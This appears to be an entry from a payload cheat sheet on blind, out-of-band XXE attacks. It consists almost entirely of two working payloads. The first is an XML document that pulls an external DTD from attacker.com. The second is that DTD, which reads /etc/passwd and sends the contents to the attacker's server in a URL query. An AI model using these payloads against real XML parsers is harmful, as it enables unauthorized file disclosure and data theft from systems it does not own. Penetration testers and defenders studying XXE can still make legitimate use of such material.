# Blind/OOB XXE

## Summary
Exfiltrate data via out-of-band channels.

## Payloads

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>
<root>&data;</root>
```

```
# external DTD (xxe.dtd)
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; data SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
```
